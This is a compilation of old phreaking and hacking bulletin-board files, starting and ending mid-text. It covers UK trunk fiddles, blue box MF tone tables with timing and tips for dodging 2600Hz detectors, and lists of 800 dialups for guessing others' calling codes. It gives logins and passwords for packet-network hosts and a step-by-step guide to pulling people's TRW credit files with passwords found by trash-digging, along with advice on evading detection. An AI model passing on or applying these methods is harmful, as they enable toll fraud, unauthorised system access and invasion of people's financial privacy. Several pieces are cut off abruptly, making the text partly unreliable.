  THE BRITISH PREFER TO GET ONTO THE TRUNKS RATHER THAN CHAINING.  ONE WAY WAS
TO DISCOVER WHERE LOCAL CALLS USE THE TRUNKS BETWEEN NEIGHBORING EXCHANGES,
START A CALL AND STAY ON THE TRUNK INSTEAD OF RETURNING TO THE LOCAL LEVEL ON
REACHING THE DISTANT SWITCH.  THIS AGAIN REQUIRED EXHAUSTIVE DIALING AND MADE
MORE WORK FOR TITAN; IT ALSO REVEALED 'FIDDLES', WHICH WERE INSERTED BY POST
OFFICE ENGINEERS.

  WHAT FIDDLING MEANS IS THAT THE ENGINEERS REWIRED THE EXCHANGES FOR THEIR OWN
BENEFIT.  THE EQUIPMENT IS MODIFIED TO GIVE ACCESS TO A TRUNK WITH OUT BEING
CHARGED, AN OPERATION WHICH IS PRETTY EASY IN STEP BY STEP (SXS)
ELECTROMECHANICAL EXCHANGES, WHICH WERE INSTALLED IN BRITAIN EVEN IN THE 1970S
(NOTE:  I KNOW OF A BACK DOOR INTO THE CANADIAN SYSTEM ON A 4A CO., SO IF YOU
ARE ON SXS OR A 4A, TRY SCANNING 3 DIGIT EXCHANGES, IE:  DIAL 999,998,997
ETC.#AND LISTEN FOR THE BEEP-KERCHINK, IF THERE ARE NO 3 DIGIT CODES WHICH
ALLOW DIRECT ACCESS TO A TANDEM IN YOUR LOCAL EXCHANGE AND BYPASSES THE AMA SO
YOU WON'T BE BILLED, NOT HAVE TO BLAST 2600 EVERY TIME YOU WISH TO BOX A CALL.

  A FAMOUS BRITISH 'FIDDLER' REVEALED IN THE EARLY 1970S WORKED BY DIALING 173.
THE CALLER THEN ADDED THE TRUNK CODE OF 1 AND THE SUBSCRIBERS LOCAL NUMBER.  AT
THAT TIME, MOST ENGINEERING TEST SERVICES BEGAN WITH 17X, SO THE ENGINEERS
COULD HIDE THEIR FIDDLES IN THE NEST OF SERVICE WIRES.  WHEN SECURITY REPS
STARTED SEARCHING, THE FIDDLES WERE CONCEALED BY TONES SIGNALLING:  'NUMBER
UNOBTAINALBE' OR 'EQUIPMENT ENGAGED' WHICH SWITCHED OFF AFTER A DELAY.  THE
NECESSARY RELAYS ARE SMALL AND EASILY HIDDEN.

  THERE WAS ANOTHER SIDE TO PHREAKING IN THE UK IN THE SIXTIES. BEFORE STD WAS
WIDESPREAD, MANY 'ORDINARY' PEOPLE WERE DRIVEN TO.

OCCASIONAL PHREAKING FROM SHEER FRUSTRATION AT THE INEFFICIENT OPERATOR
CONTROLLED TRUNK SYSTEM.  THIS CAME TO A HEAD DURING A STRIKE ABOUT 1961 WHEN
OPERATORS COULD NOT BE REACHED.  NOTHING COMPLICATED WAS NEEDED.  MANY
OPERATORS HAD BEEN IN THE HABIT OF REPEATING THE CODES AS THEY DIALLED THE
REQUESTED NUMBERS SO PEOPLE SOON LEARNT THE NUMBERS THEY CALLED FREQUENTLY.
THE ONLY 'TRICK' WAS TO KNOW WHICH EXCHANGES COULD BE DIALLED THROUGH TO PASS
ON THE TRUNK NUMBER.CALLERS ALSO NEEDED A PRETTY QUIET PLACE TO DO IT, SINCE
TIMING RELATIVE TO CLICKS WAS IMPORTANT THE MOST FAMOUS TRIAL OF BRITISH
PHREAKS WAS CALLED THE OLD BAILY TRIAL.#WHICH STARTED ON 3 OCT.  1973.#WHAT
THEY PHREAKS DID WAS TO DIAL A SPARE NUMBER AT A LOCAL CALL RATE BUT INVOLVING
A TRUNK TO ANOTHER EXCHANGE THEN THEY SEND A 'CLEAR FORWARD' TO THEIR LOCAL
EXCHANGE, INDICATING TO IT THAT THE CALL IS FINISHED;BUT THE DISTANT EXCHANGE
DOESN'T REALIZE BECAUSE THE CALLER'S PHONE IS STILL OFF THE HOOK.  THEY NOW
HAVE AN OPEN LINE INTO THE DISTANT TRUNK EXCHANGE AND SENDS TO IT A 'SEIZE'
SIGNAL:  '1' WHICH PUTS HIM ONTO ITS OUTGOING LINES NOW, IF THEY KNOW THE
CODES, THE WORLD IS OPEN TO THEM.  ALL OTHER EXCHANGES TRUST HIS LOCAL EXCHANGE
TO HANDLE THE BILLING; THEY JUST INTERPRET THE TONES THEY HEAR.  MEAN WHILE,
THE LOCAL EXCHANGE COLLECTS ONLY FOR A LOCAL CALL.  THE INVESTIGATORS
DISCOVERED THE PHREAKS HOLDING A CONFERENCE SOMEWHERE IN ENGLAND SURROUNDED BY
VARIOUS PHONE EQUIPMENT AND BLEEPER BOXES, ALSO PRINTOUTS LISTING 'SECRET' POST
OFFICE CODES.  (THEY PROBABLY GOT THEM FROM TRASHING?) THE JUDGE SAID:  "SOME

                               Bad as Shit

   Recently, a telephone fanatic in the  northwest made an interesting
discovery.  He was exploring the 804 area code (Virginia) and found out that
the 840 exchange did something strange.
  In the vast majority of cases, in fact in all of the cases except one, he
would get a recording as if the exchange didn't exist. However, if he dialed
804-840 and four rather predictable numbers, he got a ring!

   After one or two rings, somebody picked up.  Being experienced at this kind
of thing, he could tell that the call didn't "supe", that is, no charges were
being incurred for calling this number.
  (Calls that get you to an error message, or a special operator, generally
don't supervise.)  A female voice, with a hint of a Southern accent said,
"Operator, can I help you?"

   "Yes," he said, "What number have I reached?"

   "What number did you dial, sir?"

   He made up a number that was similar.

   "I'm sorry that is not the number you reached."  Click.

   He was fascinated.  What in the world was this?  He knew he was going to
call back, but before he did, he tried some more experiments. He tried the 840
exchange in several other area codes.  In some, it came up as a valid exchange.
In others, exactly the same thing happened -- the same last four digits, the
same Southern belle.  Oddly enough, he later noticed, the areas worked in
seemed to travel in a beeline from Washington DC to Pittsburgh, PA.

   He called back from a payphone.  "Operator, can I help you?"

   "Yes, this is the phone company.  I'm testing this line and we don't seem to
have an identification on your circuit.  What office is this, please?"

   "What number are you trying to reach?"

   "I'm not trying to reach any number.  I'm trying to identify this circuit."

   "I'm sorry, I can't help you."

   "Ma'am, if I don't get an ID on this line, I'll have to disconnect it.  We
show no record of it here."

   "Hold on a moment, sir."

   After about a minute, she came back.  "Sir, I can have someone speak to you.
Would you give me your number, please?"

   He had anticipated this and he had the payphone number ready. After he gave
it, she said, "Mr. XXX will get right back to you."

   "Thanks."  He hung up the phone.  It rang.  INSTANTLY!  "Oh my God," he
thought, "They weren't asking for my number -- they were confirming it!"

   "Hello," he said, trying to sound authoritative.

   "This is Mr. XXX.  Did you just make  an inquiry to my office concerning a
phone number?"

   "Yes.  I need an identi--"

   "What you need is advice.  Don't ever call that number again. Forget you
ever knew it."

   At this point our friend got so nervous he just hung up.  He expected to
hear the phone ring again but it didn't.

   Over the next few days he racked his brains trying to figure out what the
number was.  He knew it was something big -- that was pretty certain at this
point.  It was so big that the number was programmed into every central office
in the country.  He knew this because if he tried to dial any other number in
that exchange, he'd get a local error message from his CO, as if the exchange
didn't exist.

   It finally came to him.  He had an uncle who worked in a federal agency.  He
had a feeling that this was government related and if it was, his uncle could
probably find out what it was.  He asked the next day and his uncle promised to
look into the matter.

   The next time he saw his uncle, he noticed a big change in his manner.  He
was trembling.  "Where did you get that number?!"  he shouted.  "Do you know I
almost got fired for asking about it?!? They kept wanting to know where I got
it."

   Our friend couldn't contain his excitement.  "What is it?" he pleaded.
"What's the number?!"

"IT'S THE PRESIDENT'S BOMB SHELTER!"

   He never called the number after that.  He knew that he could probably cause
quite a bit of excitement by calling the number and saying something like, "The
weather's not good in Washington.  We're coming over for a visit."  But our
friend was smart.  he knew that there were some things that were better off
unsaid and undone.

  It seems that not many of you know that Telenet is connected to about 80
computer-networks in the world. No, I don't mean 80 nodes, but 80 networks with
thousands of unprotected computers. When you call your local Telenet- gateway,
you can only call those computers which accept reverse-charging- calls.
  If you want to call computers in foreign countries or computers in USA which
do not accept R-calls, you need a Telenet-ID. Did you ever notice that you can
type ID XXXX when being connected to Telenet? You are then asked for the
password. If you have such a NUI (Network-User-ID) you can call nearly every
host connected to any computer-network in the world. Here are some examples:

026245400090184 :Is a VAX in Germany  (Username: DATEXP and leave mail for
CHRIS  !!!)
0311050500061   :Is the Los Alamos Integrated computing network (One of the
hosts connected to it is the DNA (Defense Nuclear Agency)!!!)
0530197000016   :Is a BBS in New Zealand
024050256       :Is the S-E-Bank in Stockholm, Sweden (Login as GAMES !!!)
02284681140541  :CERN in Geneva in Switzerland (one of the biggest nuclear
research centers in the world) Login as GUEST
0234212301161   :A Videotex-standard system. Type OPTEL to get in and use the
ID 999_ with the password 9_
0242211000001   :University of Oslo in Norway (Type  LOGIN 17,17  to play the
Multi-User-Dungeon !)
0425130000215   :Something like ITT Dialcom, but this one is in Israel ! ID
HELP  with password HELP  works fine with security level 3
0310600584401   :Is the Washington Post News Service via Tymnet (Yes, Tymnet is
connected to Telenet, too !)  ID and Password is: PETER You can read the news
of the next day !

The prefixes are as follows:
02624  is Datex-P in Germany
02342  is PSS in England
03110  is Telenet in USA
03106  is Tymnet in USA
02405  is Telepak in Sweden
04251  is Isranet in Israel
02080  is Transpac in France
02284  is Telepac in Switzerland
02724  is Eirpac in Ireland
02704  is Luxpac in Luxembourg
05252  is Telepac in Singapore
04408  is Venus-P in Japan
...and so on... Some of the countries have more than one
packet-switching-network (USA has 11, Canada has 3, etc).

OK. That should be enough for the moment. As you see most of the passwords are
very simple. This is because they must not have any fear of hackers. Only a few
German hackers use these networks. Most of the computers are absolutely easy to
hack !!! So, try to find out some Telenet-ID's and leave them here. If you need
more numbers, leave e-mail.
I'm calling from Germany via the German Datex-P network, which is similar to
Telenet. We have a lot of those NUI's for the German network, but none for a
special Tymnet-outdial-computer in USA, which connects me to any phone #.

PS: Call 026245621040000 and type ID INF300 with password DATACOM to get more

Informations on packet-switching-networks !

PS2: The new password for the Washington Post is KING !!!!



`Fucking with the Operator                    courtesy of Exodus

           Ever get an operator who gave you a hard time, and you didn't know
what to do? Well if the operator hears you use a little Bell jargon, she might
wise up. Here is a little diagram (excuse the artwork) of the structure of
operators

/--------\     /------\     /-----\
!Operator!-- > ! S.A. ! --->! BOS !
\--------/     \------/     \-----/
   !
   !
   V
/-------------\
! Group Chief !
\-------------/

    Now most of the operators are not bugged, so they can curse at you, if they
do ask INSTANTLY for the "S.A." or the Service Assistant. The operator does not
report to her (95% of them are hers) but they will solve most of your problems.
She MUST give you her name as she connects & all of these calls are bugged. If
the SA gives you a rough time get her BOS (Business Office Supervisor) on the
line. S/He will almost always back her girls up, but sometimes the SA will get
tarred and feathered. The operator reports to the Group Chief, and S/He will
solve 100% of your problems, but the chances of getting S/He on the line are
nill.
    If a lineman (the guy who works out on the poles) or an installation man
gives you the works ask to speak to the Installation Foreman, that works
wonders.
    Here is some other bell jargon, that might come in handy if you are having
trouble with the line. Or they can be used to lie your way out of
situations....

     An Erling is a line busy for 1 hour, used mostly in traffic studies A
Permanent Signal is that terrible howling you get if you disconnect, but don't
hang up.
     Everyone knows what a busy signal is, but some idiots think that is the
*Actual* ringing of the phone, when it just is a tone "beeps" when the phone is
ringing, wouldn't bet on this though, it can (and does) get out of sync.
     When you get a busy signal that is 2 times as fast as the normal one, the
person you are trying to reach isn't really on the phone, (he might be), it is
actually the signal that a trunk line somewhere is busy and they haven't or
can't reroute your call. Sometimes you will get a Recording, or if you get
nothing at all (Left High & Dry in fone terms) all the recordings are being
used and the system is really overused, will probably go down in a little
while. This happened when Kennedy was shot, the system just couldn't handle the
calls. By the way this is called the "reorder signal" and the trunk line is
"blocked".
     One more thing, if an overseas call isn't completed and doesn't generate
any money for AT&T, is is called an "Air & Water Call".

AT&T is no longer as stupid as she once was.  I advise STRONG caution when
phucking with Ma Bell.  -= Exodus =-

To dial international calls:

International Access Code + Country code + Routing code

Example :

To call Frankfurt, Germany, you would do the following:

011 + 49 + 611 + (# wanted) + # sign(octothrope)

The # sign at the end is to tell Bell that you are done entering in all the

More TRW Info                          Courtesy of the Jolly Roger

Trw is a large database in which company's and banks can run credit
checks on their customers.  Example: John Jones orders 500$ worth of stereo
equipment from the Joe Blow Electronic distributtng Co.  Well it could be that
he gave the company a phony credit card number, or doesn't have enough credit, 
etc.  Well they call up Trw and then run a check on him, trw then lists his 
card numbers (everything from sears to visa) and tells the numbers, credit,
when he lost it last (if he ever did) and then of course tells if he has had 
any prior problems paying his bills.

I would also like to add that although Trw contains information on
millions of people, not every part of the country is served, although the major
area are..  So if you hate someone and live in a small state, you probably
wont be able to order him 300 pink toilet seats from K-mart.

Logging on
==========

To log on, you dial-up your local access number (or long-distance, what
ever turns you on) and wait for it to say "trw" at this promt, you type
either an "A" or a "Ctrl-G" and it will say "circuit building in progress"
it will wait for a minute and then clear the screen, now you will type
one of the following.

Tca1
Tca2
Tnj1
Tga1

This is to tell it what geographical area the customer is in, it really
doesnt matter which you use, because trw will automatically switch when
it finds the record..

Next, you will type in the pswd and info on the person you are trying to
get credit info on:  you type it in a format like this:

Rts Pswd Lname Fname ...,House number First letter of street name Zip <cr>
now you type ctrl s and 2 ctrl q's here is what it looks like in real life:


Ae: Dialing xxx-xxx-xxxx

(screen clear)
Trw ^G

circuit building in progress

(pause . . . screen clear)

Tca1

Rtc 3966785-cm5 Johnson David ...,4567 
R 56785 
^s ^q ^q

and then it will wait for a few seconds and print out the file on him
(if it can locate one for the guy)

note: you may have to push return when you first connect to get the systems
attention.

Getting Your Passwords
======================

To obtain pswds, you go down to your favorite bank or sears store and
dig through the trash (hence the name trashing) looking for printouts, if
they are a big enough place, and live in a trw area, then they will probably
have some.  The printouts will have the 7 digit subscriber code, leaving the
3-4 digit pswd up to you.  Much like trashing down at good old ma bell.

/-/   Phreak Dictionary   /-/
 
     Here you will find some of the basic but necessary terms that should be
known by any phreak who wants to be respected at all.
 
         Phreak  : 1. The action of using mischevious and mostly illegal
                      ways in order to not pay for some sort of tele-
                      communications bill, order, transfer, or other service.
                      It often involves usage of highly illegal boxes and
                      machines in order to defeat the security that is set
                      up to avoid this sort of happening. [fr'eaking]. v.

                   2. A person who uses the above methods of destruction and
                      chaos in order to make a better life for all.  A true
                      phreaker will not not go against his fellows or narc
                      on people who have ragged on him or do anything
                      termed to be dishonorable to phreaks. [fr'eek]. n.

                   3. A certain code or dialup useful in the action of
                      being a phreak. (Example: "I hacked a new metro
                      phreak last night.")
 
 Switching System: 1. There are 3 main switching systems currently employed
                      in the US, and a few other systems will be mentioned
                      as background.

                    A) SxS: This system was invented in 1918 and was
                       employed in over half of the country until 1978. It
                       is a very basic system that is a general waste of
                       energy and hard work on the linesman. A good way to
                       identify this is that it requires a coin in the phone
                       booth before it will give you a dial tone, or that no
                       call waiting, call forwarding, or any other such
                       service is available.  Stands for: Step by Step

                    B) XB: This switching system was first employed in 1978
                       in order to take care of most of the faults of SxS
                       switching.  Not only is it more efficient, but it
                       also can support different services in various forms.
                       XB1 is Crossbar Version 1. That is very limited and
                       is hard to distinguish from SxS except by direct view
                       of the wiring involved. Next up was XB4, Crossbar
                       Version 4. With this system, some of the basic things
                       like DTMF that were not available with SxS can be
                       accomplished. For the final stroke of XB, XB5 was
                       created. This is a service that can allow DTMF plus
                       most 800 type services (which were not always
                       available.) Stands for: Crossbar.

                    C) ESS: A nightmare in telecom. In vivid color, ESS is
                       a pretty bad thing to have to stand up to. It is
                       quite simple to identify. Dialing 911 for emergencies,
                       and ANI [see ANI below] are the most common facets of
                       the dread system. ESS has the capability to list in a
                       person's caller log what number was called, how long
                       the call took, and even the status of the conversation
                       (modem or otherwise.) Since ESS has been employed,
                       which has been very recently, it has gone through
                       many kinds of revisions. The latest system to date is
                       ESS 11a, that is employed in Washington D.C. for
                       security reasons. ESS is truly trouble for any
                       phreak, because it is 'smarter' than the other
                       systems. For instance, if on your caller log they saw
                       50 calls to 1-800-421-9438, they would be able to do
                       a CN/A [see Loopholes below] on your number and
                       determine whether you are subscribed to that service
                       or not. This makes most calls a hazard, because
                       although 800 numbers appear to be free, they are
                       recorded on your caller log and then right before you
                       receive your bill it deletes the billings for them.
                       But before that the are open to inspection, which is
                       one reason why extended use of any code is dangerous
                       under ESS. Some of the boxes [see Boxing below] are
                       unable to function in ESS.  It is generally a menace
                       to the true phreak. Stands For: Electronic Switching
                       System. Because they could appear on a filter
                       somewhere or maybe it is just nice to know them
                       anyways.

                       A) SSS: Strowger Switching System. First
                          non-operator system available.

                       B) WES: Western Electronics Switching. Used about 40
                          years ago with some minor places out west.

            Boxing:  1) The use of personally designed boxes that emit or
                        cancel electronical impulses that allow simpler
                        acting while phreaking. Through the use of separate
                        boxes, you can accomplish most feats possible with
                        or without the control of an operator.

                     2) Some boxes and their functions are listed below.
                        Ones marked with '*' indicate that they are not
                        operatable in ESS.

                      *Black Box: Makes it seem to the phone company that
                                  the phone was never picked up.
                      Blue Box  : Emits a 2600hz tone that allows you to do
                                  such things as stack a trunk line, kick
                                  the operator off line, and others.
                        Red Box : Simulates the noise of a quarter, nickel,
                                  or dime being dropped into a payphone.
                     Cheese Box : Turns your home phone into a pay phone to
                                  throw off traces (a red box is usually
                                  needed in order to call out.)
                     *Clear Box : Gives you a dial tone on some of the old
                                  SxS payphones without putting in a coin.
                      Beige Box : A simpler produced linesman's handset that
                                  allows you to tap into phone lines and
                                  extract by eavesdropping, or crossing
                                  wires, etc.
                     Purple Box : Makes all calls made out from your house
                                  seem to be local calls.

          ANI [ANI]: 1) Automatic Number Identification. A service
                        available on ESS that allows a phone service [see
                        Dialups below] to record the number that any certain
                        code was dialed from along with the number that was
                        called and print both of these on the customer bill.
                        950 dialups [see Dialups below] are all designed
                        just to use ANI. Some of the services do not have
                        the proper equipment to read the ANI impulses yet,
                        but it is impossible to see which is which without
                        being busted or not busted first.

 Dialups [dy'l'ups]: 1) Any local or 800 extended outlet that allows instant
                        access to any service such as MCI, Sprint, or AT&T
                        that from there can be used by handpicking or using
                        a program to reveal other peoples codes which can
                        then be used moderately until they find out about
                        it and you must switch to another code (preferrably
                        before they find out about it.)

                     2) Dialups are extremely common on both senses. Some
                        dialups reveal the company that operates them as
                        soon as you hear the tone. Others are much harder
                        and some you may never be able to identify.  A small
                        list of dialups:

                             1-800-421-9438 (5 digit codes)
                             1-800-547-6754 (6 digit codes)
                             1-800-345-0008 (6 digit codes)
                             1-800-734-3478 (6 digit codes)
                             1-800-222-2255 (5 digit codes)

                     3) Codes: Codes are very easily accessed procedures
                        when you call a dialup. They will give you some sort
                        of tone.  If the tone does not end in 3 seconds,
                        then punch in the code and immediately following the
                        code, the number you are dialing but strike the
                        '1' in the beginning out first. If the tone does
                        end, then punch in the code when the tone ends.
                        Then, it will give you another tone.  Punch in the
                        number you are dialing, or a '9'. If you punch in
                        a '9' and the tone stops, then you messed up a
                        little. If you punch in a tone and the tone
                        continues, then simply dial then number you are
                        calling without the  '1'.

                     4) All codes are not universal. The only type that I
                        know of that is truly universal is Metrophone.
                        Almost every major city has a local Metro dialup
                        (for Philadelphia, (215)351-0100/0126) and since the
                        codes are universal, almost every phreak has used
                        them once or twice. They do not employ ANI in any
                        outlets that I know of, so feel free to check
                        through your books and call 555-1212 or, as a more
                        devious manor, subscribe yourself. Then, never use
                        your own code. That way, if they check up on you due
                        to your caller log, they can usually find out that
                        you are subscribed.  Not only that but you could set
                        a phreak hacker around that area and just let it
                        hack away, since they usually group them, and, as a
                        bonus, you will have their local dialup.

                     5) 950's. They seem like a perfectly cool phreakers
                        dream. They are free from your house, from payphones,
                        from everywhere, and they host all of the major long
                        distance companies (950)1044 <MCI>, 950)1077
                        <Sprint>, 950-1088 <S+ylines>, 950-1033 <Us
                        Telecom>.) Well, they aren't. They were designed for
                        ANI. That is the point, end of discussion.
 
     A phreak dictionary. If you remember all of the things contained on
that fileup there, you may have a better chance of doing whatever it is you
do. This next section is maybe a little more interesting...
 
Blue Box Plans:
---------------
 
     These are some blue box plans, but first, be warned, there have been
2600hz tone detectors out on operator trunk lines since XB4. The idea behind
it is to use a 2600hz tone for a few very naughty functions that can really
make your day lighten up. But first, here are the plans, or the heart of the
file:

700  :   1   :   2   :   4   :   7   :  11   :
900  :   +   :   3   :   5   :   8   :  12   :
1100 :   +   :   +   :   6   :   9   :  KP   :
1300 :   +   :   +   :   +   :  10   :  KP2  :
1500 :   +   :   +   :   +   :   +   :  ST   :
     : 700   : 900   :1100   :1300   :1500   :
 
     Stop! Before you diehard users start piecing those little tone tidbits
together, there is a simpler method. If you have an Apple-Cat with a
program like Cat's Meow IV, then you can generate the necessary tones, the
2600hz tone, the KP tone, the KP2 tone, and the ST tone through the dial
section. So if you have that I will assume you can boot it up and it works,
and I'll do you the favor of telling you and the other users what to do with
the blue box now that you have somehow constructed it. The connection to an
operator is one of the most well known and used ways of having fun with your
blue box. You simply dial a TSPS (Traffic Service Positioning Station, or
the operator you get when you dial '0') and blow a 2600hz tone through the
line. Watch out! Do not dial this direct! After you have done that, it is
quite simple to have fun with it. Blow a KP tone to start a call, a ST tone
to stop it, and a 2600hz tone to hang up. Once you have connected to it,
here are some fun numbers to call with it:

      0-700-456-1000  Teleconference (free, because you are the operator!)
      (Area code)-101 Toll Switching
      (Area code)-121 Local Operator (hehe)
      (Area code)-131 Information
      (Area code)-141 Rate & Route
      (Area code)-181 Coin Refund Operator
      (Area code)-11511 Conference operator (when you dial 800-544-6363)

     Well, those were the tone matrix controllers for the blue box and some
other helpful stuff to help you to start out with. But those are only the
functions with the operator. There are other k-fun things you can do with it.

 More advanced Blue Box Stuff:

     Oops. Small mistake up there. I forgot tone lengths. Um, you blow a
tone pair out for up to 1/10 of a second with another 1/10 second for silence
between the digits. KP tones should be sent for 2/10 of a second. One way to
confuse the 2600hz traps is to send pink noise over the channel (for all of
you that have decent BSR equalizers, there is major pink noise in there.)

     Using the operator functions is the use of the 'inward' trunk line.
Thatis working it from the inside. From the 'outward' trunk, you can do such
things as make emergency breakthrough calls, tap into lines, busy all of the
lines in any trunk (called 'stacking'), enable or disable the TSPS's, and
for some 4a systems you can even re-route calls to anywhere.
 
     All right. The one thing that every complete phreak guide should be
without is blue box plans, since they were once a vital part of phreaking.
Another thing that every complete file needs is a complete listing of all of
the 800 numbers around so you can have some more Fu7nC
 /-/   800 Dialup Listings  /-/
 
1-800-345-0008 (6)   1-800-547-6754 (6)
1-800-245-4890 (4)   1-800-327-9136 (4)
1-800-526-5305 (8)   1-800-858-9000 (3)
1-800-437-9895 (7)   1-800-245-7508 (5)
1-800-343-1844 (4)   1-800-322-1415 (6)
1-800-437-3478 (6)   1-800-325-7222 (6)
 
     All right, set Cat Hacker 1.0 on those numbers and have a fuck of a
day. That is enough with 800 codes, by the time this gets around to you I
dunno what state those codes will be in, but try them all out anyways and
see what you get. On some 800 services now, they have an operator who will
answer and ask you for your code, and then your name. Some will switch back
and forth between voice and tone verification, you can never be quite sure
which you will be upagainst.

     Armed with this knowledge you should be having a pretty good time
phreaking now. But class isn't over yet, there are still a couple important
rules that you should know. If you hear continual clicking on the line, then
you should assume that an operator is messing with something, maybe even
listening in on you. It is a good idea to call someone back when the phone
starts doing that. If you were using a code, use a different code and/or
service to call him back.

     A good way to detect if a code has gone bad or not is to listen when
the number has been dialed. If the code is bad you will probably hear the
phone ringing more clearly and more quickly than if you were using a
different code.  If someone answers voice to it then you can immediately
assume that it is an operative for whatever company you are using. The famed
'311311' code for Metro is one of those. You would have to be quite stupid
to actually respond, because whoever you ask for the operator will always
say 'He's not in right now, can I have him call you back?' and then they
will ask for your name and phone number. Some of the more sophisticated
companies will actually give you a carrier on a line that is supposed to
give you a carrier and then just have garbage flow across the screen like it
would with a bad connection. That is a feeble effort to make you think that
the code is still working and maybe get you to dial someone's voice, a good
test for the carrier trick is to dial anumber that will give you a carrier
that you have never dialed with that code before, that will allow you to
determine whether the code is good or not. For our next section, a lighter
look at some of the things that a phreak should not be without. A vocabulary.
A few months ago, it was a quite strange world for the modem people out
there. But now, a phreaker's vocabulary is essential if you wanna make a
good impression on people when you post what you know about certain subjects.
 
 /-/    Vocabulary    /-/
 
 - Do not misspell except certain exceptions:

             phone -> fone
             freak -> phreak

 - Never substitute 'z's for 's's. (i.e. codez -> codes)

 - Never leave many characters after a post (i.e. Hey Dudes!#!@#@!#!@)

 - NEVER use the 'k' prefix (k-kool, k-rad, k-whatever)

 - Do not abbreviate. (I got lotsa wares w/ docs)

 - Never substitute '0' for 'o' (r0dent, l0zer).

 - Forget about ye old upper case, it looks ruggyish.
 
     All right, that was to relieve the tension of what is being drilled
into your minds at the moment.  Now, however, back to the teaching course.
Here are somethings you should know about phones and billings for phones,
etc.
 
     LATA: Local Access Transference Area. Some people who live in large
cities or areas may be plagued by this problem. For instance, let's say you
live in the 215 area code under the 542 prefix (Ambler, Fort Washington). If
you went to dial in a basic Metro code from that area, for instance,
351-0100, that might not be counted under unlimited local calling because it
is out of your LATA.  For some LATA's, you have to dial a '1' without the
area code before you can dial the phone number. That could prove a hassle
for us all if you didn't realize you would be billed for that sort of call.
In that way, sometimes, it is better to be safe than sorry and phreak.

     The Caller Log: In ESS regions, for every household around, the phone
company has something on you called a Caller Log. This shows every single
number that you dialed, and things can be arranged so it showed every number
that was calling to you. That's one main disadvantage of ESS, it is mostly
computerized so a number scan could be done like that quite easily. Using a
dialup is an easy way to screw that, and is something worth remembering.
Anyways, with the caller log, they check up and see what you dialed. Hmm...
you dialed 15 different 800 numbers that month. Soon they find that you are
subscribed to none of those companies. But that is not the only thing. Most
people would imagine "But wait! 800 numbers don't show up on my phone
bill!". To those people, it is a nice thought, but 800 numbers are picked up
on the caller log until right before they are sent off to you. So they can
check right up on you before they send it away and can note the fact that
you fucked up slightly and called one too many 800 lines.
 
     Right now, after all of that, you should have a pretty good idea of how
to grow up as a good phreak. Follow these guidelines, don't show off, and
don't take unnecessary risks when phreaking or hacking.

      BOXES - GENERAL INFORMATION

   THE FOLLOWING "GOLDEN OLDIE (1980) IS FROM THE LEGENDARY "8BBS" OF BERNARD
KLATT IN SANTA CLARA, CA.  THIS IS THE FIRST PHREAK BBS THAT I EVER HEARD OF IT
WAS A PDP-8 THAT COULD SUPPORT TWO USERS.  IT "DISAPPEARED" AFTER AN OMNI
MAGAZINE ARTICLE WAS PUBLISHED ABOUT PHREAKING WAS PUBLISHED

   RESURRECTED BY BILL DOGER (PLEASE DOWNLOAD AND SAVE FOR POSTERITY)

   SUBJECT:  BASIC BOXES, PART I

   THIS IS SOME REASONABLE BASIC STUFF, SO EXPERIENCED HACKERS MAY WISH TO SKIP
THESE MESSAGES.

   WHAT I WILL PROVIDE HERE IS A SUMMARY OF THE THREE MOST IMPORTANT BOXES, SOME
OF THE WAYS THE TELCOES TRY TO CATCH BOXERS, AND SOME SUGGESTIONS ON AVOIDING
BEING CAUGHT.

   THE MOST FAMOUS BOX, THE BLUE BOX, IS ESSENTIALLY LIKE A PORTABLE TOUCH-TONE
PAD, EXCEPT THE TONES ARE NOT TOUCH-TONE (DTMF) -- THEY ARE THE TRUNK SIGNALLING
FREQUENCIES (MF).  THESE FREQUENCIES WERE GIVEN BY SUSAN IN A MESSAGE A FEW
BACK.  A GOOD BOX ALSO CONTAINS THE SUPERVISION CONTROL FREQUENCY, 2600HZ (SF).

   HACKERS USE THE BOX BY GAINING ACCESS TO A DDD (OR OTHER) NETWORK SENDER
(IT'S LIKE A DIAL TONE), USUALLY BY MAKING AN 800 OR 555 CALL.  A MUCH BETTER
ACCESS IS IF THERE ARE LOCAL TANDEMS IN YOUR AREA USED FOR NON-ACCOUNTED CALLS
BUT ALLOWING NON-LOCAL OUTGOING CALLS.

   HACKERS USE BLUE BOXES BECAUSE IT ALLOWS THE INTRODUCTION OF NETWORK DIAL
CODES OTHER THAN AREA-CODE AND NUMBER AND OPENED AN INCREDIBLY COMPLEX MAZE TO
BE EXPLORED AND TOYED WITH.  OTHER PEOPLE USED BLUE BOXES TO COMPLETE CALLS
WITHOUT PAYING.  THIS MADE AT&T INTENT ON STOPPING THE ACCESS; TO THEM THE
HACKERS TYING UP TANDEMS FROM KALAMAZOO TO MOSCOW WERE A NUISANCE, AND THE
OTHERS WERE THIEVES.

   ONE OF THE MOST SUCCESSFUL MEANS OF CATCHING BLUE BOXERS WAS AND IS THE
FEATURE IN THE ACCOUNTING PROGRAM WHICH CALLS ATTENTION TO ANY NUMBER WHICH
SHOWS A LARGE NUMBER OF 800 OR 555 CALLS.  (WE KNOW OF TELECOMMUNICATIONS
MANAGERS WHO HAVE BEEN CALLED BY AT&T TO FIND OUT WHY SO AND SO - AN EMPLOYEE -
MAKES SO MANY CALLS TO THE COMPANY 800 NUMBER.) OTHER MEANS INCLUDE ANALYZING
TRUNK TROUBLE REPORTS (IF YOUR BOX DOESN'T TREAT THE TRUNK THE SAME WAY AT&TS
EQUIPMENT DOES, IT CAN IN SOME CASES GENERATE TROUBLE REPORTS).

   ONCE THE SUSPICION IS THERE, YOUR LOCAL TELCO PUTS A "PEN RECORDER" ON YOUR
LINE, AND EVERYTHING YOU DIAL - ROTARY, TOUCH-TONE, OR MF GETS RECORDED ON PAPER
- THIS PAPER WILL BE USED AS EVIDENCE AGAINST YOU.

   EVENTUALLY THE U.S.  GOVERNMENT PROSECUTES YOU FOR "INTERSTATE FRAUD BY WIRE"
-- AN EXTREMELY BROAD LAW.  MORE ABOUT THAT LAW IN FUTURE STUFF.

   IN ORDER TO ELIMINATE BLUE BOXING, WHICH RELIES ON THE USE OF THE MF SIGNALS
ON THE SAME CIRCUIT THAT YOU TALK ON, MA BELL IS CONVERTING TO A NEW SYSTEM -
COMMON CHANNEL INTEROFFICE SIGNALLING (CCIS).  THERE ARE MANY BENEFITS OF CCIS
OTHER THAN ELIMINATING BLUE BOXING, BUT IT WILL EVENTUALLY ELIMINATE BLUE BOXING
BECAUSE IT SENDS THE NETWORK SIGNALLING INFORMATION ON DATA LINKS BETWEEN SIGNAL
TRANSFER POINTS (STPS) ASSOCIATED WITH VARIOUS SWITCHING MACHINES.

